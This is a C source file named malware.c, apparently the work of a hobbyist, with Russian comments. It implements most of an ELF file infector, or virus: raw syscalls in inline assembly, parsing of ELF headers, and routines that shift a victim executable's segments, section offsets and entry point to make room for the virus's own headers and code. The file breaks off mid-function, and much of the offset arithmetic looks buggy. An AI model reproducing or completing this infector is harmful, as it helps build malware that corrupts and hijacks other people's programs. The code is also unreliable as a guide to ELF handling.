/* Compile: gcc malware.c -o malware */
/* Usage: ./malware */
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>

/* ничем не отличается от структуры Elf64_Phdr, определенной в elf.h,
   но почему-то компиляторуоказывается неизвестен размер такой структуры,
   из-за чего возникают ошибки компиляции */

typedef struct Elf64_Phdr_str {
    unsigned int          p_type;       /* Segment type */
    unsigned int          p_flags;      /* Segment flags */
    unsigned long long    p_offset;     /* Segment file offset */
    unsigned long long    p_vaddr;      /* Segment virtual address */
    unsigned long long    p_paddr;      /* Segment physical address */
    unsigned long long    p_filesz;     /* Segment size in file */
    unsigned long long    p_memsz;      /* Segment size in memory */
    unsigned long long    p_align;      /* Segment alignment */
} Elf64_Phdr_str;

/* созданная по аналогичным причинам структура заголовка секции */
typedef struct Elf64_Shdr_str {
    unsigned int          sh_name;      /* Section name (string tbl index) */
    unsigned int          sh_type;      /* Section type */
    long long             sh_flags;     /* Section flags */
    unsigned long long    sh_addr;      /* Section virtual addr at execution */
    unsigned long long    sh_offset;        /* Section file offset */
    long long             sh_size;      /* Section size in bytes */
    unsigned int          sh_link;      /* Link to another section */
    unsigned int          sh_info;      /* Additional section information */
    long long             sh_addralign;     /* Section alignment */
    long long             sh_entsize;       /* Entry size if section holds table */
} Elf64_Shdr_str;

/* глобальные переменные для возвращаемых значений функций
   fopen, fread, open, read, close и mmap*/
/* это единственный способ присвоить возвращаемое ассемблерным кодом
   значение сишной переменной - даже если локальные переменные объявлены в куче,
   компилятор сначала кладет адрес переменной в стек,
   и только затем присваивает ему значение. Нам это не подходит, поскольку неизвестно,
   куда именно в стеке будет записан адрес, а взаимодествовать
   со стеком вслепую = получить segfault*/

void* return_mmap_ptr = NULL;
int return_open_fd;
int return_close_val;
int return_read_count;

/* хранит размер открытого эльфе-жертвы, нужен для fread */
long opened_file_size;
long num_of_wrote_bytes;

int victim_entry_point;
void print_elf_header_field(  Elf64_Ehdr* header_ptr );

typedef struct new_offset_and_size {
    unsigned long long offset;
    unsigned long long filesz;
} new_offset_and_size;

/* вызывает stat */
void call_stat ( const char* path_name, struct stat *stat_struct ) {
    __asm__( "mov $4, %rax\n\t"
             "syscall\n\t");
}

/* вызывает mmap */
void* call_mmap ( void *address,
                  size_t length,
                  int protect,
                  int flags,
                  int filedes,
                  off_t offset ) {

    __asm__("push %rbx \n\t"
            "push %rcx \n\t"
            "push %rdx \n\t"
            "push %rbp \n\t"
            "push %r10 \n\t"
            "push %r14 \n\t"
            "push %r15 \n\t"

            "mov %r9, %r15 \n\t"
            "mov %rsi, %r13 \n\t"
            "mov %rdi, %r12 \n\t"
            "mov %ecx, %r14d \n\t"

            "movslq %r8d, %rbp \n\t"
            "movslq %edx, %rbx \n\t"
            "movslq %r14d, %r10 \n\t"
            "mov $0x9, %eax \n\t"

            "syscall \n\t"
            "movq %rax, return_mmap_ptr(%rip) \n\t"

            "pop %r15 \n\t"
            "pop %r14 \n\t"
            "pop %r10 \n\t"
            "pop %rbp \n\t"
            "pop %rdx \n\t"
            "pop %rcx \n\t"
            "pop %rbx \n\t"
            );

    return return_mmap_ptr;
}

/* вызывает open */
int call_open (const char *filename, int flags) {

    __asm__( "mov $2, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_open_fd(%rip) \n\t"
             );

    return return_open_fd;
}

long call_write(unsigned int fd, char *buf, size_t count) {
    __asm__( "mov $1, %rax\n\t"
             "syscall\n\t"
             "movq %rax, num_of_wrote_bytes(%rip) \n\t"
             );
    return num_of_wrote_bytes;
}
/* вызывает close */
int call_close (unsigned int fd) {

    __asm__( "mov $3, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_close_val(%rip) \n\t");

    return return_close_val;
}

/* вызывает read */
int call_read (unsigned int fd, char *buf, size_t count) {

    __asm__( "mov $0, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_read_count(%rip) \n\t"
             );
    return return_read_count;
}

int call_jmp (int addr) {

    if ( addr == 0 ) {
        return -1;
    }
    __asm__( "jmp *%rdi \n\t"
             );

    return 0;
}

/* мой вариант fopen */
/* основное отличие от библиотечного fopen состоит в том,
   что мой не принимает флаги, поскольку у меня файлы всегда будут
   открываться на чтение или запись */
void* call_fopen ( const char *filename, int flags ) {
    int fd = call_open( filename, flags );
    void* ptr;

    if ( fd < 0 ) {
        printf("fopen: Не удалось открыть файл, ошибка № %d\n",
               errno);
        return NULL;
    }

    struct stat mystruct;
    call_stat( filename, &mystruct );

    opened_file_size = mystruct.st_size;
    switch ( flags ) {

    case O_RDWR:
        ptr = call_mmap( NULL, opened_file_size,
                          PROT_READ|PROT_WRITE, MAP_SHARED,
                          fd, 0 );
        break;

    case O_RDONLY:
        ptr = call_mmap( NULL, opened_file_size,
                          PROT_READ, MAP_SHARED,
                          fd, 0 );
        break;

    case O_WRONLY:
        ptr = call_mmap( NULL, opened_file_size,
                          PROT_READ, MAP_SHARED,
                          fd, 0 );
        break;

    default:
        /* маппим файл в память */
        ptr = call_mmap( NULL, opened_file_size,
                          PROT_NONE, MAP_SHARED,
                          fd, 0 );
    }

    if ( ( ptr == MAP_FAILED ) || ( ptr < 0 ) ) {
        printf("fopen: Mapping Failed, err number %d \n",
               errno);
        printf("fopen: mmap returned bad pointer: %p\n", ptr);
        return NULL;
    }
    return ptr;
}
/* мой вариант memcpy */
void* call_memcpy(void* dest, void* source, size_t n ) {

    char* d = (char*)dest;
    char* s = (char*)source;

    /* printf("call_memcpy: dest %p \n", dest); */
    /* printf("call_memcpy: source %p \n", source); */

    for (int i = 0; i < n; i++ ) {
        *d = *s;
        d++;
        s++;
    }
    /* printf("return from call_memcpy \n"); */
}

void* call_fread ( void* ptr_sourse, size_t count, size_t bytes,
                   void* ptr_dest ) {

    long readed_bytes = 0;

    for( int i = 0; i < count; i++ ) {

        /* страховка, чтоб не прочитать больше, чем есть в файле */
        if( readed_bytes >= opened_file_size ) {
            return ptr_sourse;
        }

        /* memcpy( ptr_dest, ptr_sourse, bytes ); */
        call_memcpy( ptr_dest, ptr_sourse, bytes );

        ptr_dest = ptr_dest + bytes;
        ptr_sourse = ptr_sourse + bytes;
        readed_bytes = readed_bytes + bytes;
    }
    return ptr_sourse;
}

/* распечатывает все поля заголовка эльфа */
void print_elf_header_field(  Elf64_Ehdr* header_ptr ) {
    Elf64_Ehdr header = *header_ptr;

    printf("print elf header: \n");

    printf("header.e_type : %d\n", header.e_type);
    printf("header.e_machine : %d\n", header.e_machine);
    printf("header.e_version : %ud\n", header.e_version);
    printf("header.e_entry : %p\n", (void*)header.e_entry);
    printf("header.e_phoff : %lu\n", header.e_phoff);
    printf("header.e_shoff : %lu\n", header.e_shoff);
    printf("header.e_flags : %d\n", header.e_flags);
    printf("header.e_ehsize : %d\n", header.e_ehsize);
    printf("header.e_phentsize : %d\n", header.e_phentsize);
    printf("header.e_phnum : %d\n", header.e_phnum);
    printf("header.e_shentsize : %d\n", header.e_shentsize);
    printf("header.e_shnum : %d\n", header.e_shnum);
    printf("header.e_shstrndx : %d\n", header.e_shstrndx);

    printf("\n");
}

/* печатает все поля заголовка программы - заголовков самого исполняемого кода программы*/
void print_programm_header( Elf64_Phdr_str * programm_header_ptr ) {
    struct Elf64_Phdr_str programm_header = *programm_header_ptr;

    printf("print programm header: \n");

    printf("programm_header.p_type : %d \n", programm_header.p_type);
    printf("programm_header.p_flags : %d \n", programm_header.p_flags);
    printf("programm_header.p_offset : %llu \n", programm_header.p_offset);
    printf("programm_header.p_filesz : %llu \n", programm_header.p_filesz);
    printf("programm_header.p_memsz : %llu \n", programm_header.p_memsz);
    printf("programm_header.p_vaddr : %p \n",  (void*)programm_header.p_vaddr);
    printf("programm_header.p_paddr : %p \n",  (void*)programm_header.p_paddr);
    printf("programm_header.p_align : %llu \n", programm_header.p_align);

    printf("\n");
}

void print_all_programm_headers(Elf64_Phdr_str * program_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_programm_header( program_header_array );
        program_header_array++;
    }
}

/* печатает все поля заголовка секции - весь код программы поделен на секции,
   у каждой есть заголовок */
void print_section_header( Elf64_Shdr_str *section_header_ptr ) {
    struct Elf64_Shdr_str section_header = *section_header_ptr;

    printf("print section header: \n");

    printf("section_header.sh_name : %d \n", section_header.sh_name);
    printf("section_header.sh_type : %d \n", section_header.sh_type);
    printf("section_header.sh_flags : %lld \n", section_header.sh_flags);

    printf("section_header.sh_offset : %llu \n", section_header.sh_offset);
    printf("section_header.sh_size : %llu \n", section_header.sh_size);

    printf("section_header.sh_addr : %p \n",  (void*)section_header.sh_addr);
    printf("section_header.sh_link : %d \n", section_header.sh_link);
    printf("section_header.sh_info : %d \n", section_header.sh_info);

    printf("section_header.sh_addralign : %lld \n", section_header.sh_addralign);
    printf("section_header.sh_entsize : %lld \n", section_header.sh_entsize);

    printf("\n");
}

void print_all_section_headers(Elf64_Shdr_str * section_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_section_header( section_header_array );
        section_header_array++;
    }
}

void print_new_offset_and_size( new_offset_and_size *data_array, int n ) {

    printf("print new offsets and sizes of programm segments: \n");
    for (int i = 0; i < n; i++ ) {
        printf("new offset : %llu \n",data_array[i].offset );
        printf("new size : %llu \n", data_array[i].filesz);
        printf("\n");
    }
}

/* читает заголовок эльфа из памяти  */
void read_elf_header( void* mmaped_file_ptr, Elf64_Ehdr* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Ehdr), header_struct );
}

/* читает заголовок секции из памяти  */
void read_section_header( void* mmaped_file_ptr, Elf64_Shdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Shdr_str), header_struct );
}

/* читает заголовок программы из памяти  */
void read_program_header( void* mmaped_file_ptr, Elf64_Phdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Phdr_str), header_struct );
}

/* читает остальной код  */
void read_rest_code( void* mmaped_file_ptr, char* buf, int n) {
    call_fread( mmaped_file_ptr, n, sizeof(char), buf );
}

/* позволяет пропустить заданное количество символов, сдвигая указатель  */
void* miss_symbols( void* mmaped_file_ptr, long n) {
    return mmaped_file_ptr + n;
}

/* прибавляет n байт к смещению в каждом заголовке программы */
Elf64_Phdr_str* add_offset_to_programs ( int n, unsigned long long offset,
                                         Elf64_Phdr_str* array ) {
    struct Elf64_Phdr_str header;
    for( int i = 0; i < n; i++) {
        header = array[i];
        header.p_offset = header.p_offset + offset;
        array[i] = header;
    }
}

/* выгружает все заголовки кода в массив */
Elf64_Phdr_str* get_program_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Phdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Phdr_str),
                array_headers );
    return array_headers;
}

Elf64_Shdr_str* get_section_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Shdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Shdr_str),
                array_headers );
    return array_headers;
}

/* ищет заголовок последнего сегмента в массиве заголовков */
/* последним сегментом считается тот, который находится дальше всех от начала файла и */
/* имеет самый большой размер */
Elf64_Phdr_str * find_last_segment( int n, Elf64_Phdr_str * headers_array,
                                    Elf64_Phdr_str * program_header_last_segment) {

    struct Elf64_Phdr_str program_header;

    for( int i = 0; i < n; i++) {
        program_header = headers_array[i];

        if (i == 0) {
            *program_header_last_segment = program_header;

        } else if (  (*program_header_last_segment).p_offset +
                     (*program_header_last_segment).p_filesz
                     <= program_header.p_offset +  program_header.p_filesz ) {

            *program_header_last_segment = program_header;
        }
    }
    return program_header_last_segment;
}

/* сортирует пузырьком заголовки программы по размеру сегментов, которые они описывают
   (от максимального к минимальному) */
Elf64_Phdr_str* sort_program_headers (int n, Elf64_Phdr_str* array) {
    struct Elf64_Phdr_str a;
    struct Elf64_Phdr_str b;

    void bubble_sort( ) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];
            if ( a.p_filesz < b.p_filesz ) {
                array[i] = b;
                array[i+1] = a;

            }
        }
    }

    Elf64_Phdr* check_array (int n, Elf64_Phdr_str* array) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];

            if ( a.p_filesz < b.p_filesz ) {
                bubble_sort();
                check_array (n, array);
            }
        }
    }
    check_array (n, array);
    return array;
}

int count_new_offset_and_size_of_segments ( new_offset_and_size*
                                            new_array,
                                            Elf64_Phdr_str*
                                            array_program_headers,
                                            int n ) {
    Elf64_Phdr_str table_header;
    Elf64_Phdr_str cur_header;
    new_offset_and_size new_data;
    long long old_filesz;
    int j = 0;

    /* считает новое смещение и размер сегмента, который описывает заголовок */
    int count( new_offset_and_size* new_array,
               long long* cur_offset,
               long long* cur_filesz ) {

        printf("cur_offset %llu \n", *cur_offset);
        printf("cur_filesz %llu \n", *cur_filesz);

        for ( int i = 0; i <= j; i++ ) {

            /* printf("*cur_offset + *cur_filesz = %lld table_header.p_offset %lld \n", */
            /*        *cur_offset + *cur_filesz, table_header.p_offset); */

            if ( ( ( *cur_offset >= new_array[i].offset ) &&
                   ( ( *cur_offset + *cur_filesz ) <=
                     ( new_array[i].offset + new_array[i].filesz) ) ) ||
                 ( ( *cur_offset >= table_header.p_offset ) &&
                   ( ( *cur_offset + *cur_filesz ) <=
                     ( table_header.p_offset + table_header.p_filesz) ) ) ) {

                printf("блоки полностью накладваются друг на друга \n \n");

                *cur_filesz = -1;
                return *cur_filesz;

                /* смещения не равны */
            } else if ( ( *cur_offset + *cur_filesz > table_header.p_offset ) &&
                        ( *cur_offset < table_header.p_offset ) ) {
                printf("смещения не равны, сегмент начинается до таблицы заголовков\n \n");
                if ( *cur_offset == 0 ) {
                    *cur_offset = table_header.p_offset + table_header.p_filesz;
                    *cur_filesz = *cur_filesz - *cur_offset;
                } else {
                *cur_filesz = table_header.p_offset - *cur_offset;

                }
            } else if ( ( *cur_offset + *cur_filesz > new_array[i].offset ) &&
                        ( *cur_offset < new_array[i].offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается до текущего сегмента и накладывается на него\n \n");
                *cur_filesz = new_array[i].offset - *cur_offset;

            } else if ( ( table_header.p_offset + table_header.p_filesz > *cur_offset )
                        &&
                        ( *cur_offset + *cur_filesz > table_header.p_offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается до таблицы заголовков, накладывается на таблицу\n \n");

                old_filesz = *cur_filesz;

                if ( ( table_header.p_offset + ( *cur_offset ) ) >
                     ( *cur_filesz + *cur_offset ) ) {

                    *cur_filesz = ( table_header.p_offset + *cur_offset ) -
                        ( *cur_filesz + *cur_offset );
                    *cur_offset = *cur_offset + old_filesz;

                } else {
                    *cur_filesz = ( *cur_filesz + *cur_offset ) -
                        ( table_header.p_offset + *cur_offset );
                    *cur_offset = *cur_offset + old_filesz;
                }

            } else if ( ( new_array[i].offset + new_array[i].filesz > *cur_offset ) &&
                        ( *cur_offset + *cur_filesz > new_array[i].offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается внутри текущего сегмента\n \n");
                old_filesz = *cur_filesz;

                if ( ( new_array[i].offset + ( *cur_offset ) ) >
                     ( *cur_filesz + *cur_offset ) ) {
                    *cur_filesz = ( ( new_array[i].offset + ( *cur_offset ) ) -
                                    ( *cur_filesz + *cur_offset ) );
                    *cur_offset = *cur_offset + old_filesz;

                } else {
                    *cur_filesz = ( ( *cur_filesz + *cur_offset ) -
                                    ( new_array[i].offset + ( *cur_offset ) ) );
                    *cur_offset = ( *cur_offset ) + old_filesz;
                }

            } else if ( ( table_header.p_offset == *cur_offset ) ||
                    ( new_array[i].offset == *cur_offset ) ) {

                printf(" смещения равны \n \n");
                if ( table_header.p_filesz < *cur_filesz ) {
                    *cur_offset = *cur_offset + *cur_filesz;
                    *cur_filesz = *cur_filesz - table_header.p_filesz;

                } else if ( new_array[i].filesz < *cur_filesz )  {
                    *cur_offset = *cur_offset + new_array[i].filesz;
                    *cur_filesz = *cur_filesz - new_array[i].filesz;
                }
            }
        }
        return 0;
    }

    table_header = array_program_headers[0];

    sort_program_headers (n, array_program_headers);

    printf("sorted program headers array : \n");
    print_all_programm_headers(array_program_headers, n );

    /* printf("cur_offset %p \n", cur_offset); */
    /* printf("cur_filesz %p \n", cur_filesz); */

    for ( int i = 0; i < n; i++ ) {

        long long cur_filesz;
        long long cur_offset;

        if ( ( array_program_headers[i].p_type != 6 ) &&
             ( array_program_headers[i].p_type != 0 ) ) {

            cur_offset = array_program_headers[i].p_offset;
            cur_filesz = array_program_headers[i].p_filesz;

            /* printf("cur_offset before %llu \n", cur_offset); */
            /* printf("cur_filesz before %llu \n", cur_filesz); */

            count( new_array, &cur_offset, &cur_filesz );

            /* printf("здесь \n"); */
            if ( ( cur_offset > 0 ) && ( cur_filesz > 0 ) ) {

                /* printf("cur_offset after %lld \n", cur_offset); */
                /* printf("cur_filesz after %lld \n \n", cur_filesz); */

                new_array[j].offset = cur_offset;
                new_array[j].filesz = cur_filesz;
                j++;
            }
        }
    }
    return j;
}

void* count_new_addr (void* ptr, long offset) {
    return ptr + offset;
}

/* сортирует пузырьком заголовки программы по виртуальным адресам сегментов,
   которые они описывают (от минимального к максимальному) */
Elf64_Phdr_str* sort_program_headers_by_vaddr (int n, Elf64_Phdr_str* array) {
    struct Elf64_Phdr_str a;
    struct Elf64_Phdr_str b;

    void bubble_sort( ) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];
            if ( a.p_vaddr > b.p_vaddr ) {
                array[i] = b;
                array[i+1] = a;

            }
        }
    }

    Elf64_Phdr* check_array (int n, Elf64_Phdr_str* array) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];

            if ( a.p_vaddr > b.p_vaddr ) {
                bubble_sort();
                check_array (n, array);
            }
        }
    }
    check_array (n, array);
    return array;
}

/* /\* считает новые виртуальные адреса и смещения для сегментов кода */
/*    и редактирует их в заголовках программ*\/ */
/* Elf64_Phdr_str* change_vaddrs_in_program_headers ( Elf64_Phdr_str* array, */
/*                                                    long long vaddr, */
/*                                                    long offset, */
/*                                                    long n ) { */
/*     long long old_vaddr; */
/*     long old_offset; */
/*     /\* в началае таблицы заголовка программ всегда стоит заголовок самой таблицы *\/ */
/*     /\* ему новый адрес не нужен  *\/ */
/*     int i = 1; */

/*     /\* пересчитываем вирутальный адрес *\/ */
/*     for ( i; i < n; i++) { */
/*         /\* созраняем старый адрес, он нужен для подсчета */
/*            соотноешния между двумя сегментами *\/ */
/*         old_vaddr = array[i].p_vaddr; */
/*         old_offset = array[i].p_offset; */

/*         if ( array[i].p_type != 0 && ( array[i].p_vaddr != 0 ) )  { */
/*             /\* если вирутальный и физический адреса одинаковые, заменяем оба *\/ */
/*             if ( array[i].p_paddr == array[i].p_vaddr ) { */
/*                 array[i].p_vaddr = vaddr; */
/*                 array[i].p_paddr = vaddr; */
/*                 array[i].p_offset = old_offset; */

/*             } else { */
/*                 array[i].p_vaddr = vaddr; */
/*                 array[i].p_vaddr = old_offset; */
/*             } */
/*         } */
/*         /\* виртуальный адрес считается как соотношение */
/*            между текущим сегментом и следующим + новый адрес *\/ */
/*         /\* так можно посчитать на каком расстоянии находятся */
/*            друг от друга два сегмента в памяти, а затем использовать */
/*            переданный vaddr как смещение *\/ */
/*         if ( i != n - 1 ) { */
/*             if ( array[i+1].p_vaddr > old_vaddr ) { */
/*                 vaddr = vaddr + (array[i+1].p_vaddr - old_vaddr); */
/*                 if ( array[i+1].p_offset > old_offset ) { */
/*                     offset = offset + (array[i+1].p_offset - old_offset); */
/*                 } else { */
/*                     offset = offset + (old_offset - array[i+1].p_offset); */
/*                 } */
/*             } else { */
/*                 vaddr = vaddr + (old_vaddr - array[i+1].p_vaddr); */
/*                 if ( array[i+1].p_offset > old_offset ) { */
/*                     offset = offset + (array[i+1].p_offset - old_offset); */
/*                 } else { */
/*                     offset = offset + (old_offset - array[i+1].p_offset); */
/*                 } */
/*             } */
/*         } */
/*     } */
/*     return array; */
/* } */

/* считает новые виртуальные адреса для сегментов кода и редактирует
   их в заголовках секций, а так же смещение */
Elf64_Phdr_str* change_vaddrs_in_program_headers ( Elf64_Phdr_str* array,
                                                   long long vaddr,
                                                   long offset,
                                                   long n ) {
    long long old_vaddr;
    long old_offset;
    int i = 0;

 cycle:

    /* если все заголовки обработаны, выход */
    if ( i == n - 1 ) {
        return array;

        /* если поля заголовка не определены или адрес = 0, пропускаем заголовок */
    } else if ( ( array[i].p_type == 0 ) ||
                ( array[i].p_vaddr == 0 ) ) {

        i++;
        goto cycle;
    }


    /* в противном случае сохраняем текущие адрес и смещение, чтоб высчитать
       соотношение с адресом и смещением следующего заголовка */
    old_vaddr = array[i].p_vaddr;
    old_offset = array[i].p_offset;

    /* printf("old_vaddr %llx \n", old_vaddr ); */
    /* printf("next vaddr %llx \n", array[i+1].sh_addr ); */

    /* заменяем текущие адреса и смещение на новые */
    array[i].p_vaddr = vaddr;
    array[i].p_paddr = vaddr;
    array[i].p_offset = offset;

    if ( i != n - 1 ) {
        /* высчитываем новые адрес и смещение */

        /* если следующий адрес больше сохраненного */
        if ( array[i+1].p_vaddr > old_vaddr ) {
            /* printf("old_vaddr < next vaddr \n"); */
            vaddr = vaddr + (array[i+1].p_vaddr - old_vaddr);
            /* printf("vaddr %llx \n \n", vaddr ); */

            /* если следующее смещение больше сохраненного */
            if ( array[i+1].p_offset > old_offset ) {
                offset = offset + ( array[i+1].p_offset - old_offset );
            } else {
                offset = offset + (old_offset - array[i+1].p_offset);
            }

            /* следующий арес меньше сохраненного */
        } else {
            /* printf("old_vaddr > next vaddr \n \n"); */
            if ( array[i+1].p_vaddr != 0 ) {
                vaddr = vaddr + ( old_vaddr - array[i+1].p_vaddr );
                /* если слеующий адрес = 0, то высчитываем новый адрес, используя
                   соотношение сохраненного с тем, что идет через один */
            } else if ( array[i+1].p_vaddr == 0 ) {
                vaddr = vaddr + ( old_vaddr - array[i+2].p_vaddr );
            }

            if ( array[i+1].p_offset > old_offset ) {
                offset = offset + (array[i+1].p_offset - old_offset);

            } else {
                if ( array[i+1].p_vaddr == 0 ) {
                    offset = offset + (old_offset - array[i+2].p_offset);
                } else {
                    offset = offset + (old_offset - array[i+1].p_offset);
                }
            }

        }
    }

    i++;
    goto cycle;
}


/* считает новые виртуальные адреса для сегментов кода и редактирует
   их в заголовках секций, а так же смещение */
Elf64_Shdr_str* change_vaddrs_in_section_headers ( Elf64_Shdr_str* array,
                                                         long long vaddr,
                                                         long offset,
                                                         long n ) {
    long long old_vaddr;
    long old_offset;
    int i = 0;

 cycle:

    /* если все заголовки обработаны, выход */
    if ( i == n - 1 ) {
        return array;

        /* если поля заголовка не определены или адрес = 0, пропускаем заголовок */
    } else if ( ( array[i].sh_type == 0 ) ||
                ( array[i].sh_addr == 0 ) ) {

        i++;
        goto cycle;
    }


    /* в противном случае сохраняем текущие адрес и смещение, чтоб высчитать
       соотношение с адресом и смещением следующего заголовка */
    old_vaddr = array[i].sh_addr;
    old_offset = array[i].sh_offset;

    /* printf("old_vaddr %llx \n", old_vaddr ); */
    /* printf("next vaddr %llx \n", array[i+1].sh_addr ); */

    /* заменяем текущие адрес и смещение на новые */
    array[i].sh_addr = vaddr;
    array[i].sh_offset = offset;

    if ( i != n - 1 ) {
        /* высчитываем новые адрес и смещение */

        /* если следующий адрес больше сохраненного */
        if ( array[i+1].sh_addr > old_vaddr ) {
            /* printf("old_vaddr < next vaddr \n"); */
            vaddr = vaddr + (array[i+1].sh_addr - old_vaddr);
            /* printf("vaddr %llx \n \n", vaddr ); */

            /* если следующее смещение больше сохраненного */
            if ( array[i+1].sh_offset > old_offset ) {
                offset = offset + ( array[i+1].sh_offset - old_offset );
            } else {
                offset = offset + (old_offset - array[i+1].sh_offset);
            }

            /* следующий арес меньше сохраненного */
        } else {
            /* printf("old_vaddr > next vaddr \n \n"); */
            if ( array[i+1].sh_addr != 0 ) {
                vaddr = vaddr + ( old_vaddr - array[i+1].sh_addr );
                /* если слеующий адрес = 0, то высчитываем новый адрес, используя
                   соотношение сохраненного с тем, что идет через один */
            } else if ( array[i+1].sh_addr == 0 ) {
                vaddr = vaddr + ( old_vaddr - array[i+2].sh_addr );
            }

            if ( array[i+1].sh_offset > old_offset ) {
                offset = offset + (array[i+1].sh_offset - old_offset);

            } else {
                if ( array[i+1].sh_addr == 0 ) {
                    offset = offset + (old_offset - array[i+2].sh_offset);
                } else {
                    offset = offset + (old_offset - array[i+1].sh_offset);
                }
            }

        }
    }

    i++;
    goto cycle;
}

int test_change_vaddrs_in_program_headers ( Elf64_Phdr_str* array,
                                            long long vaddr,
                                            long offset,
                                            long n ) {
    sort_program_headers_by_vaddr(n, array);

    printf("print prigram headers with old vaddrs : \n");
    print_all_programm_headers( array, n );

    printf("begin vaddr %llx \n", vaddr);
    change_vaddrs_in_program_headers ( array, vaddr, offset, n );
    printf("print program headers with new vaddrs : \n");
    print_all_programm_headers( array, n );

}

/* редактирует заголовок первого сегмента кода жертвы, а так же все последующие */
/* поскольку к заголовкам жертвы добавятся заголовки вируса,
   то весь код жертвы будет смещен ровно ра назмер добавленных заголовков */
/* следовательно, нужно увеличить размер первого блока кода и поправить
   смещения и адреса у всех остальных заголовков, описывающих код,
   а так же поправить entry point жертвы*/
Elf64_Phdr_str* edit_header_of_first_code_block(Elf64_Ehdr* elf_header_ptr,
                                                Elf64_Phdr_str* array_program_headers,
                                                Elf64_Phdr_str* virus_table_header_ptr,
                                                int n ) {
    /* сортируем массив заголовков так,
       чтоб блок кода с наименьшим адресом оказался первым */
    sort_program_headers_by_vaddr( n, array_program_headers );

    Elf64_Phdr_str virus_table_header = *virus_table_header_ptr;
    Elf64_Phdr_str first_code_block_header;
    Elf64_Ehdr elf_header = *elf_header_ptr;

    first_code_block_header.p_type = 0;

    /* ищем заголовок, описывающий первый сегмент кода */
    for ( int i = 0; i < n; i++ ) {
        if ( ( array_program_headers[i].p_type != 0 ) &&
             ( array_program_headers[i].p_offset == 0 ) &&
             ( array_program_headers[i].p_vaddr != 0 ) ) {
            first_code_block_header = array_program_headers[i];

            /* увеличили размер сегмента на тот объем памяти, который потребуется для
               таблицы заголовков */
            /* только помним, что в файл-жертву войдут все заголовки вируса,
               кроме заголовка самой таблицы заголовков, а 1 заголовко занимает
               56 байт на 64-разрядной системе */
            first_code_block_header.p_filesz += ( virus_table_header.p_filesz - 56 );
            first_code_block_header.p_memsz += ( virus_table_header.p_memsz - 56 );

            array_program_headers[i] = first_code_block_header;
            break;
        }
    }

    /* теперь редактируем все остальные заголовки программы - весь код жертвы
       сместится ровно на столько байт, сколько занимают заголовки вируса */
    /* нужно скорректировать физический и виртуальные адреса,
       а так же смещение в файле */
     for ( int i = 0; i < n; i++ ) {
        if ( ( array_program_headers[i].p_type != 0 ) &&
             ( array_program_headers[i].p_type != 6 ) &&
             ( array_program_headers[i].p_offset != 0 ) &&
             ( array_program_headers[i].p_vaddr != 0 ) ) {

            array_program_headers[i].p_vaddr += virus_table_header.p_memsz;
            array_program_headers[i].p_paddr += array_program_headers[i].p_vaddr;
            array_program_headers[i].p_offset += virus_table_header.p_filesz - 56;
        }
     }

     /* поправляем entry point жертвы */
    elf_header.e_entry += virus_table_header.p_memsz;
    *elf_header_ptr = elf_header;
    return array_program_headers;
}

char* clear_buf (char* buf, long size ) {
    for ( int i = 0; i < size; i++ ) {
        buf[i] = 0;
    }
    return buf;
}

int test_call_write() {
    int fd = call_open("test.txt", O_RDWR);

    if ( fd < 0 ) {
        printf("call_write error\n");
    }
    char buf[12] =  "some string\n";
    call_write( fd, buf, 12);
}

long long count_offset_to_entry_point( long long victim_entry_point,
                                       long long begin_addr ) {
    long long offset = begin_addr - victim_entry_point;
    offset = offset / -1;
    return offset;
}

int test_edit_header_of_first_code_block ( Elf64_Ehdr* elf_header,
                                           Elf64_Phdr_str* array,
                                           Elf64_Phdr_str* header_table,
                                           int n ) {
    printf("print header_table : \n");
    print_programm_header( header_table );
    sort_program_headers_by_vaddr( n, array );

    /* printf("print program headers BEFORE change : \n"); */
    /* print_all_programm_headers( array, n ); */

    edit_header_of_first_code_block( elf_header, array, header_table, n );

    /* printf("print program headers AFTER change : \n"); */
    /* print_all_programm_headers( array, n ); */

}
/* редактирует заголовок эльфа */
/* указывает новую точку входа, смещение до таблицы секций,
   количество заголовков секций и программ */
Elf64_Ehdr* edit_elf_header( Elf64_Ehdr* elf_header_ptr,
                             int new_amount_of_program_headers,
                             int new_amount_of_section_headers,
                             int new_section_table_offset ) {
    Elf64_Ehdr elf_header = *elf_header_ptr;
    elf_header.e_shoff = new_section_table_offset;
    elf_header.e_phnum = new_amount_of_program_headers;
    elf_header.e_shnum = new_amount_of_section_headers;

    *elf_header_ptr = elf_header;
    return elf_header_ptr;
}

enum unic_sections_types {
    ALL_TYPES,
    TYPE_2_5,
    TYPE_2_6,
    TYPE_2_11,
    TYPE_5_6,
    TYPE_5_11,
    TYPE_6_11,
    TYPE_6_11_2,
    TYPE_6_11_5,
    TYPE_5_11_2
};

int delete_section_headers ( Elf64_Shdr_str* array_section_headers,
                             Elf64_Shdr_str* new_array_section_headers,
                             int types,
                             int n ) {
    int j = 0;

    switch ( types ) {

    case ALL_TYPES:
    for ( int i = 0; i < n; i++ ) {
        if ( array_section_headers[i].sh_type != 2 &&
             array_section_headers[i].sh_type != 5 &&
             array_section_headers[i].sh_type != 6 &&
             array_section_headers[i].sh_type != 11 ) {
            new_array_section_headers[i] = array_section_headers[i];
            j++;
        }
    }
    break;

    case  TYPE_2_5:
        for ( int i = 0; i < n; i++ ) {
